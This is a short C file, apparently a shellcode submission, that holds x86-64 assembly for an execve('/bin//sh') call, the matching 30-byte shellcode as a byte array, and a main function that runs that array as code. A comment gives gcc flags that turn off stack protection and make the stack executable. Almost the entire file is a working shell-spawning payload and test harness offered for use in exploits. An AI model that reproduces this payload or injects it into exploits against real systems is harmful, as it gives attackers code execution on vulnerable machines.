/*

made by Foxy "xHector" Hector

xor rdx,rdx
push rdx
mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi,rsp
xor rsi,rsi
xor rax,rax
add rax,59
syscall

*/

//gcc -z execstack -fno-stack-protector main.c -o main

#include <stdio.h>
#include <string.h>

int main(){
 unsigned char payload[] = "\x48\x31\xd2\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05";
 printf("The length of shellcode is : %d\n",strlen(payload));
 (*(void(*)())payload)();
 return 0;
}
